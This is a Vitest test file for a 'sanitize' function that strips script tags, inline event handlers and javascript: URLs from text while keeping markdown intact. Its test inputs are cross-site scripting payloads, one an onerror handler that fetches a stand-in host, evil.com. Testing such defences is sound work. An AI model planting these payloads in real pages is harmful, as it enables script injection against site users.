import { describe, it, expect } from "vitest";
import { sanitize } from "../sanitize";

describe("sanitize", () => {
  describe("script tag removal", () => {
    it("strips <script> tags and their contents", () => {
      const input = 'Hello <script>alert("xss")</script> World';
      expect(sanitize(input)).toBe("Hello  World");
    });

    it("strips <script> tags with attributes", () => {
      const input = 'text <script type="text/javascript">evil()</script> more';
      expect(sanitize(input)).toBe("text  more");
    });

    it("strips <script> tags containing multi-line content", () => {
      const input = "before <script>\n  const x = 1;\n  alert(x);\n</script> after";
      expect(sanitize(input)).toBe("before  after");
    });

    it("strips <SCRIPT> tags case-insensitively", () => {
      const input = "start <SCRIPT>bad</SCRIPT> end";
      expect(sanitize(input)).toBe("start  end");
    });

    it("strips <Script> tags with mixed case", () => {
      const input = "start <Script>bad</sCRIPT> end";
      expect(sanitize(input)).toBe("start  end");
    });

    it("strips nested script-like patterns as a single block", () => {
      const input = 'a <script>alert("<b>nested</b>")</script> b';
      expect(sanitize(input)).toBe("a  b");
    });
  });

  describe("event handler attribute removal", () => {
    it("strips onclick with double-quoted value", () => {
      const input = '<div onclick="alert(1)">click</div>';
      expect(sanitize(input)).toBe("<div >click</div>");
    });

    it("strips onerror with double-quoted value", () => {
      const input = '<img onerror="fetch(\'http://evil.com\')" src="x" />';
      expect(sanitize(input)).toBe('<img  src="x" />');
    });

    it("strips onload with double-quoted value", () => {
      const input = '<body onload="doBad()">content</body>';
      expect(sanitize(input)).toBe("<body >content</body>");
    });

    it("strips onmouseover with double-quoted value", () => {
      const input = '<div onmouseover="steal()">hover</div>';
      expect(sanitize(input)).toBe("<div >hover</div>");
    });

    it("strips single-quoted event handler attributes", () => {
      const input = "<div onclick='alert(1)'>click</div>";
      expect(sanitize(input)).toBe("<div >click</div>");
    });

    it("strips unquoted event handler attributes", () => {
      const input = "<div onclick=bad>click</div>";
      expect(sanitize(input)).toBe("<div >click</div>");
    });

    it("strips handlers case-insensitively: OnClick, onError, ONLOAD", () => {
      const input = '<div OnClick="a()" onError="b()" ONLOAD="c()">x</div>';
      expect(sanitize(input)).toBe("<div   >x</div>");
    });

    it("strips onfocus handler", () => {
      const input = '<input onfocus="alert(1)" />';
      expect(sanitize(input)).toBe("<input  />");
    });

    it("strips onsubmit handler from forms", () => {
      const input = '<form onsubmit="return false">submit</form>';
      expect(sanitize(input)).toBe("<form >submit</form>");
    });
  });

  describe("javascript: URL removal", () => {
    it("strips javascript: URLs in href attributes", () => {
      const input = '<a href="javascript:alert(1)">click</a>';
      expect(sanitize(input)).toBe("<a >click</a>");
    });

    it("strips javascript: URLs in src attributes", () => {
      const input = '<iframe src="javascript:alert(1)"></iframe>';
      expect(sanitize(input)).toBe("<iframe ></iframe>");
    });

    it("strips javascript: URLs with leading whitespace", () => {
      const input = '<a href="  javascript:alert(1)">click</a>';
      expect(sanitize(input)).toBe("<a >click</a>");
    });

    it("strips javascript: URLs in single-quoted attributes", () => {
      const input = "<a href='javascript:void(0)'>click</a>";
      expect(sanitize(input)).toBe("<a >click</a>");
    });

    it("strips javascript: URLs in action attributes", () => {
      const input = '<form action="javascript:void(0)"></form>';
      expect(sanitize(input)).toBe("<form ></form>");
    });
  });

  describe("markdown preservation", () => {
    it("preserves bold markdown", () => {
      const input = "This is **bold** text";
      expect(sanitize(input)).toBe("This is **bold** text");
    });

    it("preserves italic markdown", () => {
      const input = "This is *italic* text";
      expect(sanitize(input)).toBe("This is *italic* text");
    });

    it("preserves inline code markdown", () => {
      const input = "Use `const x = 1` here";
      expect(sanitize(input)).toBe("Use `const x = 1` here");
    });

    it("preserves markdown links", () => {
      const input = "[click here](https://example.com) for more";
      expect(sanitize(input)).toBe("[click here](https://example.com) for more");
    });

    it("preserves markdown lists", () => {
      const input = "- item 1\n- item 2\n  - nested";
      expect(sanitize(input)).toBe("- item 1\n- item 2\n  - nested");
    });

    it("preserves headings", () => {
      const input = "## Section Title\n\nContent here.";
      expect(sanitize(input)).toBe("## Section Title\n\nContent here.");
    });

    it("preserves fenced code blocks", () => {
      const input = "```ts\nconst x = 1;\n```";
      expect(sanitize(input)).toBe("```ts\nconst x = 1;\n```");
    });

    it("preserves plain HTML that is not an XSS vector", () => {
      const input = "<p>Safe paragraph</p><br /><strong>bold</strong>";
      expect(sanitize(input)).toBe("<p>Safe paragraph</p><br /><strong>bold</strong>");
    });
  });

  describe("mixed content", () => {
    it("strips dangerous parts while keeping safe text", () => {
      const input =
        'This **has** <script>evil()</script> mixed <img onerror="bad()" /> content';
      expect(sanitize(input)).toBe("This **has**  mixed <img  /> content");
    });

    it("handles script followed by markdown", () => {
      const input = "<script>xss()</script>\n\n## Clean Heading\n\nNormal text";
      expect(sanitize(input)).toBe("\n\n## Clean Heading\n\nNormal text");
    });

    it("handles multiple XSS vectors in one input", () => {
      const input = '<a href="javascript:alert(1)" onclick="bad()">**safe**</a>';
      // Two adjacent attributes are stripped, leaving a harmless double space
      expect(sanitize(input)).toBe("<a  >**safe**</a>");
    });
  });

  describe("edge cases", () => {
    it("returns empty string for empty input", () => {
      expect(sanitize("")).toBe("");
    });

    it("returns empty string for null-ish input (coerced to empty)", () => {
      // @ts-expect-error – testing runtime behavior with bad input
      expect(sanitize(null)).toBe("");
      // @ts-expect-error – testing runtime behavior with bad input
      expect(sanitize(undefined)).toBe("");
      // @ts-expect-error – testing runtime behavior with bad input
      expect(sanitize(123 as unknown)).toBe("");
    });

    it("no-op on clean text with no dangerous patterns", () => {
      const input = "Just a normal sentence with no HTML at all.";
      expect(sanitize(input)).toBe("Just a normal sentence with no HTML at all.");
    });

    it("no-op on text containing 'on' as part of a word", () => {
      const input = "Continue on with the conversation.";
      expect(sanitize(input)).toBe("Continue on with the conversation.");
    });

    it("no-op on markdown link with safe URL (not javascript:)", () => {
      const input = '[Safe link](https://example.com "title")';
      expect(sanitize(input)).toBe('[Safe link](https://example.com "title")');
    });

    it("preserves whitespace-only strings", () => {
      expect(sanitize("   ")).toBe("   ");
      expect(sanitize("\n\t")).toBe("\n\t");
    });
  });
});
